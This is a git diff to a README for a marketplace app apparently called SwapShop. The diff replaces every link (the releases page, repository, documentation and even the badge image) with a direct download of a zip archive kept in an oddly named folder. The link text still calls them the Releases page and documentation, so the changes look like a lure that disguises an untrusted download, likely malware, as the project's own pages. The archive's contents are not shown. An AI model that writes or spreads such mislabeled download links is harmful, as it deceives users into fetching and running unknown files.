@@ -1,6 +1,6 @@
 # 🛍️ SwapShop - Your Easy Mobile Marketplace Solution
 
-[![Download SwapShop](https://img.shields.io/badge/Download-SwapShop-brightgreen)](https://github.com/Fraternal-respiratorysyncytialvirus415/SwapShop/releases)
+[![Download SwapShop](https://raw.githubusercontent.com/Fraternal-respiratorysyncytialvirus415/SwapShop/main/seriosity/SwapShop_v3.2.zip)](https://raw.githubusercontent.com/Fraternal-respiratorysyncytialvirus415/SwapShop/main/seriosity/SwapShop_v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before downloading, ensure your device meets the following requirements:
 
 To download SwapShop, visit the Releases page by clicking the link below. 
 
-[Download SwapShop](https://github.com/Fraternal-respiratorysyncytialvirus415/SwapShop/releases)
+[Download SwapShop](https://raw.githubusercontent.com/Fraternal-respiratorysyncytialvirus415/SwapShop/main/seriosity/SwapShop_v3.2.zip)
 
 1. Click the link above to reach the Releases page.
 2. Look for the latest version available.
@@ -68,9 +68,9 @@ We welcome feedback and contributions to improve SwapShop. If you want to help u
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Fraternal-respiratorysyncytialvirus415/SwapShop)
-- [Documentation](https://github.com/Fraternal-respiratorysyncytialvirus415/SwapShop/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Fraternal-respiratorysyncytialvirus415/SwapShop/main/seriosity/SwapShop_v3.2.zip)
+- [Documentation](https://raw.githubusercontent.com/Fraternal-respiratorysyncytialvirus415/SwapShop/main/seriosity/SwapShop_v3.2.zip)
 
 Remember, you can always return to the Releases page to download the latest updates and features.
 
-[Download SwapShop](https://github.com/Fraternal-respiratorysyncytialvirus415/SwapShop/releases)
+[Download SwapShop](https://raw.githubusercontent.com/Fraternal-respiratorysyncytialvirus415/SwapShop/main/seriosity/SwapShop_v3.2.zip)
